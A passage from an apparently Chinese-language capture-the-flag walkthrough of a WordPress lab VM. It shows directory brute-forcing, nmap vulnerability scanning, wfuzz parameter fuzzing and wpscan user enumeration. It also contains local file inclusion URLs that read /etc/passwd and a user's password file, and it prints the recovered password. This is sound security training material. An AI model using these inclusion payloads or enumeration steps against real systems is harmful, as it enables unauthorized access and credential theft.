END_TIME: Wed Jun  <span class="token number">5</span> 07:57:25 <span class="token number">2024</span>
DOWNLOADED: <span class="token number">46120</span> - FOUND: <span class="token number">15</span>

┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># dirb http://192.168.6.162/ -X .txt,.php,.zip</span>

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed Jun  <span class="token number">5</span> 08:53:00 <span class="token number">2024</span>
URL_BASE: http://192.168.6.162/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: <span class="token punctuation">(</span>.txt,.php,.zip<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>.txt<span class="token punctuation">)</span><span class="token punctuation">(</span>.php<span class="token punctuation">)</span><span class="token punctuation">(</span>.zip<span class="token punctuation">)</span> <span class="token punctuation">[</span>NUM <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">]</span>

-----------------

GENERATED WORDS: <span class="token number">4612</span>                                                          

---- Scanning URL: http://192.168.6.162/ ----
+ http://192.168.6.162/image.php <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:147<span class="token punctuation">)</span>                                                                                             
+ http://192.168.6.162/index.php <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:136<span class="token punctuation">)</span>                                                                                             
+ http://192.168.6.162/secret.txt <span class="token punctuation">(</span>CODE:200<span class="token operator">|</span>SIZE:412<span class="token punctuation">)</span>                                                                                            
                                                                                                                                                 
-----------------
END_TIME: Wed Jun  <span class="token number">5</span> 08:53:14 <span class="token number">2024</span>
DOWNLOADED: <span class="token number">13836</span> - FOUND: <span class="token number">3</span>

                                                                                       
</code></pre> 
<blockquote> 
 <p>bash终端显示的日志前面有“+”表示扫描出的网站目录。</p> 
</blockquote> 
<h4><a id="242_dirsearch_314"></a>2.4.2 dirsearch目录扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># dirsearch -u 192.168.6.162 -e * -x 404</span>
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources <span class="token function">import</span> DistributionNotFound, VersionConflict

  _<span class="token operator">|</span><span class="token builtin class-name">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.3
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>

Extensions: <span class="token number">39772</span>.zip <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: <span class="token number">25</span> <span class="token operator">|</span> Wordlist size: <span class="token number">9481</span>

Output File: /home/kali/reports/_192.168.6.162/_24-06-05_07-59-25.txt

Target: http://192.168.6.162/

<span class="token punctuation">[</span>07:59:25<span class="token punctuation">]</span> Starting: 
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.ht_wsr.txt                                      
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccess.bak1                                   
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccess.orig                                   
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccess.save
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccess_orig                                   
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccessBAK                                     
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccess_sc
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htm                                             
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.html                                            
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccess_extra                                  
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccessOLD
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccessOLD2                                    
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htpasswds
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htaccess.sample                                 
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.httr-oauth                                      
<span class="token punctuation">[</span>07:59:29<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.htpasswd_test                                   
<span class="token punctuation">[</span>07:59:31<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.php3                                            
<span class="token punctuation">[</span>07:59:31<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /.php                                             
<span class="token punctuation">[</span>08:00:03<span class="token punctuation">]</span> <span class="token number">200</span> -  131B  - /dev                                              
<span class="token punctuation">[</span>08:00:17<span class="token punctuation">]</span> <span class="token number">301</span> -  319B  - /javascript  -<span class="token operator">&gt;</span>  http://192.168.6.162/javascript/ 
<span class="token punctuation">[</span>08:00:45<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /server-status                                    
<span class="token punctuation">[</span>08:00:45<span class="token punctuation">]</span> <span class="token number">403</span> -  278B  - /server-status/                                   
<span class="token punctuation">[</span>08:01:07<span class="token punctuation">]</span> <span class="token number">200</span> -    1KB - /wordpress/wp-login.php                           
<span class="token punctuation">[</span>08:01:07<span class="token punctuation">]</span> <span class="token number">200</span> -    4KB - /wordpress/                                       
                                                                             
Task Completed


</code></pre> 
<blockquote> 
 <p>测试结果显示,获得一些目录<br> 登录管理页：http://192.168.6.162/wordpress/wp-login.php<br> http://192.168.6.162/wordpress/wp-content/uploads/<br> http://192.168.6.162/wordpress/<br> http://192.168.6.162/dev/</p> 
</blockquote> 
<h3><a id="25__368"></a>2.5 漏洞切入点</h3> 
<h4><a id="251__369"></a>2.5.1 访问登录页</h4> 
<blockquote> 
 <p>访问链接：<br> http://192.168.6.162/wordpress/wp-login.php<br> <img src="https://images2.imgbox.com/83/c2/vSX11jpg_o.png" alt="登录页"></p> 
</blockquote> 
<h4><a id="252_dev_374"></a>2.5.2 访问dev页</h4> 
<blockquote> 
 <p>测试链接：<br> http://192.168.6.162/dev<br> <img src="https://images2.imgbox.com/80/22/GDwEO7zf_o.png" alt="level 0"><br> 返回“you are at level 0 stage…”</p> 
</blockquote> 
<h4><a id="253_wordpress_380"></a>2.5.3 访问wordpress页</h4> 
<blockquote> 
 <p>测试链接：<br> http://192.168.6.162/wordpress/<br> <img src="https://images2.imgbox.com/7b/a0/Qu1rtATx_o.png" alt="wordpress"></p> 
</blockquote> 
<h4><a id="254_poc_385"></a>2.5.4 poc扫描</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># nmap --script=vuln -p22,80 192.168.6.162</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-05 08:17 EDT
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.6.162
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0017s latency<span class="token punctuation">)</span>.

PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
<span class="token operator">|</span>_http-stored-xss: Couldn<span class="token string">'t find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn'</span>t <span class="token function">find</span> any DOM based XSS.
<span class="token operator">|</span>_http-csrf: Couldn<span class="token string">'t find any CSRF vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server'</span>s resources causing Denial Of Service.
<span class="token operator">|</span>       
<span class="token operator">|</span>     Disclosure date: <span class="token number">2009</span>-09-17
<span class="token operator">|</span>     References:
<span class="token operator">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="token operator">=</span>CVE-2007-6750
<span class="token operator">|</span>_      http://ha.ckers.org/slowloris/
<span class="token operator">|</span> http-enum: 
<span class="token operator">|</span>   /wordpress/: Blog
<span class="token operator">|</span>_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 00:0C:29:0A:67:CE <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">334.61</span> seconds

</code></pre> 
<blockquote> 
 <p>发现一个编号为：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750" rel="nofollow">CVE-2007-6750</a>的DOS攻击“ DOS attack”漏洞</p> 
</blockquote> 
<hr> 
<h2><a id="_426"></a>三、渗透测试</h2> 
<h3><a id="31_wfuzzLFI_428"></a>3.1 wfuzz和LFI</h3> 
<h4><a id="311_wfuzz_429"></a>3.1.1 wfuzz爆破参数</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hw 12 http://192.168.6.162/index.php?FUZZ</span>
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation <span class="token keyword">for</span> <span class="token function">more</span> information.
********************************************************
* Wfuzz <span class="token number">3.1</span>.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.6.162/index.php?FUZZ
Total requests: <span class="token number">951</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
ID           Response   Lines    Word       Chars       Payload                                                                          
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

000000341:   <span class="token number">200</span>        <span class="token number">7</span> L      <span class="token number">19</span> W       <span class="token number">206</span> Ch      <span class="token string">"file"</span>                                                                           

Total time: <span class="token number">1.809526</span>
Processed Requests: <span class="token number">951</span>
Filtered Requests: <span class="token number">950</span>
Requests/sec.: <span class="token number">525.5519</span>

</code></pre> 
<blockquote> 
 <p>获得一个file参数，則该靶机存在文件包含漏洞。</p> 
</blockquote> 
<h4><a id="312_LFI_456"></a>3.1.2 LFI</h4> 
<h5><a id="3121_file_457"></a>3.1.2.1 file参数</h5> 
<blockquote> 
 <p>测试连接：<br> http://192.168.6.162/index.php?file=location.txt<br> <img src="https://images2.imgbox.com/00/9a/NkG9oECv_o.png" alt="location"><br> 提示“use ‘secrettier360’ parameter on some other php page for more fun.”<br> 提示我们使用参数secrettier360</p> 
</blockquote> 
<h5><a id="3122_secrettier360_464"></a>3.1.2.2 secrettier360参数</h5> 
<h6><a id="31221_secrettier360_465"></a>3.1.2.2.1 secrettier360=</h6> 
<blockquote> 
 <p>测试连接：<br> http://192.168.6.162/image.php?secrettier360=<br> <img src="https://images2.imgbox.com/64/df/FPWUH31g_o.png" alt="image.php"></p> 
 <p>提示“finaly you got the right parameter”。<br> 我们获得正确的参数。O(∩_∩)O哈哈~</p> 
</blockquote> 
<h6><a id="31222_secrettier360FUZZ_474"></a>3.1.2.2.2 secrettier360=FUZZ</h6> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hw 17 http://192.168.6.162/image.php?secrettier360=FUZZ</span>
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation <span class="token keyword">for</span> <span class="token function">more</span> information.
********************************************************
* Wfuzz <span class="token number">3.1</span>.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.6.162/image.php?secrettier360<span class="token operator">=</span>FUZZ
Total requests: <span class="token number">951</span>

<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
ID           Response   Lines    Word       Chars       Payload                                                                          
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

000000257:   <span class="token number">200</span>        <span class="token number">13</span> L     <span class="token number">43</span> W       <span class="token number">328</span> Ch      <span class="token string">"dev"</span>                                                                            

Total time: <span class="token number">2.187057</span>
Processed Requests: <span class="token number">951</span>
Filtered Requests: <span class="token number">950</span>
Requests/sec.: <span class="token number">434.8308</span>

</code></pre> 
<blockquote> 
 <p>这一步我们获得参数值“dev”</p> 
</blockquote> 
<h6><a id="31223_secrettier360dev_502"></a>3.1.2.2.3 secrettier360=dev</h6> 
<blockquote> 
 <p>测试连接：<br> http://192.168.6.162/image.php?secrettier360=dev<br> <img src="https://images2.imgbox.com/bb/ca/JmJL2agM_o.png" alt="返回提示信息"></p> 
</blockquote> 
<h6><a id="31224_secrettier360etcpasswd_507"></a>3.1.2.2.4 secrettier360=/etc/passwd</h6> 
<blockquote> 
 <p>测试连接：<br> http://192.168.6.162/image.php?secrettier360=/etc/passwd<br> <img src="https://images2.imgbox.com/69/46/fL7cnbuK_o.png" alt="etc/passwd"></p> 
</blockquote> 
<blockquote> 
 <p>关键信息在最后一行：<br> password.txt file in my directory:<strong>/home/saket</strong>: sshd❌122:65534::/var/run/sshd:/usr/sbin/nologin</p> 
</blockquote> 
<h6><a id="31225_secrettier360homesaketpasswordtxt_515"></a>3.1.2.2.5 secrettier360=/home/saket/password.txt</h6> 
<blockquote> 
 <p>测试连接：<br> http://192.168.6.162/image.php?secrettier360=/home/saket/password.txt<br> <img src="https://images2.imgbox.com/ae/98/jbs6HvgO_o.png" alt="获得登录密码"></p> 
</blockquote> 
<blockquote> 
 <p>我们至此已经获得登录密码：</p> 
</blockquote> 
<table><thead><tr><th>序号</th><th>密码</th></tr></thead><tbody><tr><td>1</td><td>follow_the_ippsec</td></tr></tbody></table> 
<h3><a id="32_WordPress_528"></a>3.2 WordPress漏洞</h3> 
<p><code>网站登录页（目标页面）为：http://192.168.6.162/wordpress/</code></p> 
<h4><a id="321__530"></a>3.2.1 列举用户名</h4> 
<h5><a id="3211_cmseek_531"></a>3.2.1.1 cmseek扫描</h5> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># cmseek -u http://192.168.6.162/wordpress/</span>
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Updating CMSeeK result index<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Report index updated successfully<span class="token operator">!</span>

 ___ _  _ ____ ____ ____ _  _
<span class="token operator">|</span>    <span class="token operator">|</span><span class="token punctuation">\</span>/<span class="token operator">|</span> <span class="token punctuation">[</span>__  <span class="token operator">|</span>___ <span class="token operator">|</span>___ <span class="token operator">|</span>_/  by @r3dhax0r
<span class="token operator">|</span>___ <span class="token operator">|</span>  <span class="token operator">|</span> ___<span class="token operator">|</span> <span class="token operator">|</span>___ <span class="token operator">|</span>___ <span class="token operator">|</span> <span class="token punctuation">\</span>_ Version <span class="token number">1.1</span>.3 K-RONA


 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>  CMS Detection And Deep Scan  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> 

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Scanning Site: http://192.168.6.162/wordpress/
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CMS Detected, CMS ID: wp, Detection method: generator
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Version Detected, WordPress Version <span class="token number">5.2</span>.2
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Checking user registration status
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Starting passive plugin enumeration
<span class="token punctuation">[</span>x<span class="token punctuation">]</span> No plugins enumerated<span class="token operator">!</span>
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Starting passive theme enumeration
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token number">1</span> theme detected<span class="token operator">!</span>
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Starting Username Harvest
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Harvesting usernames from wp-json api
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Json api method failed trying with next
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Harvesting usernames from jetpack public api
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> No results from jetpack api<span class="token punctuation">..</span>. maybe the site doesn<span class="token string">'t use jetpack
[i] Harvesting usernames from wordpress author Parameter
[!] Couldn'</span>t enumerate usernames :<span class="token punctuation">(</span> 
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Checking version vulnerabilities using wpvulns.com
<span class="token punctuation">[</span>x<span class="token punctuation">]</span> Error Retriving data from wpvulndb

 ___ _  _ ____ ____ ____ _  _
<span class="token operator">|</span>    <span class="token operator">|</span><span class="token punctuation">\</span>/<span class="token operator">|</span> <span class="token punctuation">[</span>__  <span class="token operator">|</span>___ <span class="token operator">|</span>___ <span class="token operator">|</span>_/  by @r3dhax0r
<span class="token operator">|</span>___ <span class="token operator">|</span>  <span class="token operator">|</span> ___<span class="token operator">|</span> <span class="token operator">|</span>___ <span class="token operator">|</span>___ <span class="token operator">|</span> <span class="token punctuation">\</span>_ Version <span class="token number">1.1</span>.3 K-RONA


 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>  Deep Scan Results  <span class="token punctuation">[</span>+<span class="token punctuation">]</span> 

 ┏━Target: <span class="token number">192.168</span>.6.162
 ┃
 ┠── CMS: WordPress
 ┃    │
 ┃    ├── Version: <span class="token number">5.2</span>.2
 ┃    ╰── URL: https://wordpress.org
 ┃
 ┠──<span class="token punctuation">[</span>WordPress Deepscan<span class="token punctuation">]</span>
 ┃    │
 ┃    ├── Readme <span class="token function">file</span> found: http://192.168.6.162/wordpress//readme.html
 ┃    ├── License file: http://192.168.6.162/wordpress//license.txt
 ┃    │
 ┃    ├── Themes Enumerated: <span class="token number">1</span>
 ┃    │    │
 ┃    │    ╰── Theme: twentynineteen
 ┃    │        │
 ┃    │        ├── Version: <span class="token number">1.4</span>
 ┃    │        ╰── URL: http://192.168.6.162/wordpress//wp-content/themes/twentynineteen
 ┃    │
 ┃
 ┠── Result: /usr/share/cmseek/Result/192.168.6.162_wordpress/cms.json
 ┃
 ┗━Scan Completed <span class="token keyword">in</span> <span class="token number">27.66</span> Seconds, using <span class="token number">45</span> Requests



 CMSeeK says ~ Ja mata ne


</code></pre> 
<blockquote> 
 <p>获得一些关键信息：<br> <strong>CMS: WordPress版本：5.2.2</strong><br> <strong>Theme: twentynineteen 版本：1.4 http://192.168.6.162/wordpress//wp-content/themes/twentynineteen</strong></p> 
</blockquote> 
<h5><a id="3212_wpscan_605"></a>3.2.1.2 wpscan扫描</h5> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>
└─<span class="token comment"># wpscan --url http://192.168.6.162/wordpress/ --enumerate u</span>
_______________________________________________________________
         __          _______   _____
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>        / /  __ <span class="token punctuation">\</span> / ____<span class="token operator">|</span>
          <span class="token punctuation">\</span> <span class="token punctuation">\</span>  /<span class="token punctuation">\</span>  / /<span class="token operator">|</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>___   ___  __ _ _ __ ®
           <span class="token punctuation">\</span> <span class="token punctuation">\</span>/  <span class="token punctuation">\</span>/ / <span class="token operator">|</span>  ___/ <span class="token punctuation">\</span>___ <span class="token punctuation">\</span> / __<span class="token operator">|</span>/ _` <span class="token operator">|</span> <span class="token string">'_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.6.162/wordpress/ [192.168.6.162]
[+] Started: Wed Jun  5 09:44:44 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.6.162/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.6.162/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.6.162/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.6.162/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.2.2 identified (Insecure, released on 2019-06-18).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.6.162/wordpress/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=5.2.2&lt;/generator&gt;
 |  - http://192.168.6.162/wordpress/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=5.2.2&lt;/generator&gt;

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.6.162/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Readme: http://192.168.6.162/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.8
 | Style URL: http://192.168.6.162/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.6.162/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.4, Match: '</span>Version: <span class="token number">1.4</span>'

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating Users <span class="token punctuation">(</span>via Passive and Aggressive Methods<span class="token punctuation">)</span>
 Brute Forcing Author IDs - Time: 00:00:00 <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span class="token operator">&gt;</span> <span class="token punctuation">(</span><span class="token number">10</span> / <span class="token number">10</span><span class="token punctuation">)</span> <span class="token number">100.00</span>% Time: 00:00:00

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> User<span class="token punctuation">(</span>s<span class="token punctuation">)</span> Identified:

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> victor
 <span class="token operator">|</span> Found By: Author Posts - Display Name <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span> Confirmed By:
 <span class="token operator">|</span>  Rss Generator <span class="token punctuation">(</span>Passive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  Author Id Brute Forcing - Author Pattern <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>
 <span class="token operator">|</span>  Login Error Messages <span class="token punctuation">(</span>Aggressive Detection<span class="token punctuation">)</span>

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> No WPScan API Token given, as a result vulnerability data has not been output.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> You can get a <span class="token function">free</span> API token with <span class="token number">25</span> daily requests by registering at https://wpscan.com/register

<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Finished: Wed Jun  <span class="token number">5</span> 09:44:53 <span class="token number">2024</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Requests Done: <span class="token number">62</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cached Requests: <span class="token number">6</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Sent: <span class="token number">15.66</span> KB
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Data Received: <span class="token number">13.341</span> MB
